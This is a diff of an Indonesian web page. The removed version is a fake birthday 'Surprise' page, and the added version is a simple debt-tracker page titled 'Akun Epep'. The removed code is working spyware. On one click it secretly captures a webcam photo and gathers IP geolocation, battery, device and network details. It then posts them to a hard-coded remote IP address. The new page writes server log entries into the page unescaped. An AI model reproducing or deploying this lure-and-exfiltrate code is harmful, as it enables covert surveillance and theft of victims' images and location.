@@ -1,205 +1,99 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mancis Peng</title>
-  <style>
-    body {
-      font-family: 'Chewy', cursive ;
-      margin: 0;
-      padding: 0;
-      background: #ffcce7;
-      color: #5a2d0c;
-      text-align: center;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Akun EpEp</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-    h1 {
-      font-size: 2.5rem;
-      margin-top: 20px;
-      color: #ff6fa1;
-      text-shadow: 1px 1px 2px #ffffff, 0 0 10px #ff99c8;
-    }
+        .container {
+            background-color: #ffffff;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            width: 400px;
+        }
 
-    #collectData {
-      font-size: 1.5rem;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 50px;
-      background: linear-gradient(135deg, #ff7eb3, #ff4081);
-      color: white;
-      cursor: pointer;
-      box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
-      transition: all 0.3s ease;
-    }
+        h1 {
+            color: #007acc;
+        }
 
-    #collectData:hover {
-      background: linear-gradient(135deg, #ff4081, #ff7eb3);
-      transform: scale(1.1);
-    }
+        .info {
+            margin: 20px 0;
+            text-align: left;
+        }
 
-    #collectData:active {
-      transform: scale(1.05);
-    }
+        #log {
+            margin: 20px 0;
+            text-align: left;
+            max-height: 150px;
+            overflow-y: auto;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            background-color: #f9f9f9;
+        }
 
-    body:before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      z-index: -1;
-      background: url('https://cdn.pixabay.com/photo/2016/03/05/19/02/sweets-1238612_960_720.jpg') center/cover no-repeat;
-      opacity: 0.2;
-    }
+        button {
+            background-color: #007acc;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
 
-    #popup {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 20px;
-      background: #fff;
-      border: 3px solid #ff99c8;
-      border-radius: 15px;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-      z-index: 1000;
-    }
-
-    #popup h2 {
-      font-size: 2rem;
-      color: #ff6fa1;
-    }
-
-    #popup button {
-      background: #ff4081;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-
-    #popup button:hover {
-      background: #ff6fa1;
-    }
-  </style>
+        button:hover {
+            background-color: #005fa3;
+        }
+    </style>
 </head>
 <body>
-  <h1>Pencet Tombol dibawah</h1>
-  <button id="collectData">🎉 Surprise 🎉</button>
+    <div class="container">
+        <h1>Akun Epep</h1>
+        <div class="info">
+            <p><strong>Hutang Saat Ini:</strong> <span id="current-debt">Loading...</span></p>
+            <p><strong>Waktu Tersisa:</strong> <span id="time-left">Loading...</span></p>
+        </div>
+        <div>
+            <h3>Log Aktivitas</h3>
+            <div id="log">Loading...</div>
+        </div>
+    </div>
 
-  <div id="popup">
-    <h2>🍫🤎Happy Birthday! 🤎🍫</h2>
-    <button onclick="closePopup()">OK</button>
-  </div>
+    <script>
+        const debtDisplay = document.getElementById("current-debt");
+        const timeLeftDisplay = document.getElementById("time-left");
+        const logDisplay = document.getElementById("log");
 
-  <script>
-    function showPopup() {
-      const popup = document.getElementById('popup');
-      popup.style.display = 'block';
-    }
-
-    function closePopup() {
-      const popup = document.getElementById('popup');
-      popup.style.display = 'none';
-    }
-
-    async function capturePhoto() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-
-        await new Promise((resolve) => (video.onloadedmetadata = resolve));
-        video.play();
-
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        stream.getTracks().forEach((track) => track.stop());
-
-        return canvas.toDataURL('image/png');
-      } catch (error) {
-        console.error('Error capturing photo:', error);
-        return null;
-      }
-    }
-
-    async function collectDeviceInfo() {
-      const data = {};
-      const apiToken = "6d8519218e7b69";
-      const apiUrl = `https://ipinfo.io/json?token=${apiToken}`;
-
-      try {
-        const ipInfo = await fetch(apiUrl);
-        const ipData = await ipInfo.json();
-        data.ip = ipData.ip || "Unknown IP";
-        data.location = {
-          city: ipData.city || "Unknown",
-          region: ipData.region || "Unknown",
-          country: ipData.country || "Unknown",
-          coordinates: ipData.loc || "Unknown",
-        };
-
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          data.battery = {
-            level: battery.level * 100 + '%',
-            charging: battery.charging,
-          };
-        } else {
-          data.battery = "Battery API not supported";
+        async function fetchData() {
+            const response = await fetch("/api/debt");
+            const data = await response.json();
+            debtDisplay.textContent = `Rp ${data.current_debt}`;
+            timeLeftDisplay.textContent = data.time_left;
+            updateLog(data.log);
         }
 
-        data.device = {
-          userAgent: navigator.userAgent || "Unknown User Agent",
-          platform: navigator.platform || "Unknown Platform",
-        };
-
-        if (navigator.connection) {
-          const connection = navigator.connection;
-          data.network = {
-            type: connection.effectiveType || "Unknown",
-            downlink: connection.downlink ? connection.downlink + ' Mbps' : "Unknown",
-          };
-        } else {
-          data.network = "Network API not supported";
+        function updateLog(log) {
+            logDisplay.innerHTML = log
+                .map(entry => `<p>${entry.timestamp}: ${entry.action}</p>`)
+                .join("");
         }
-      } catch (error) {
-        console.error("Error collecting device info:", error);
-      }
 
-      return data;
-    }
-
-    document.getElementById('collectData').addEventListener('click', async () => {
-      showPopup();
-      const photo = await capturePhoto();
-      const deviceInfo = await collectDeviceInfo();
-
-      const data = {
-        photo: photo,
-        deviceInfo: deviceInfo,
-      };
-
-      try {
-        const response = await fetch('http://36.75.64.201:5000/data', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
-        });
-        const result = await response.json();
-        console.log('Server response:', result);
-      } catch (error) {
-        console.error('Error sending data:', error);
-      }
-    });
-  </script>
+        fetchData();
+    </script>
 </body>
 </html>
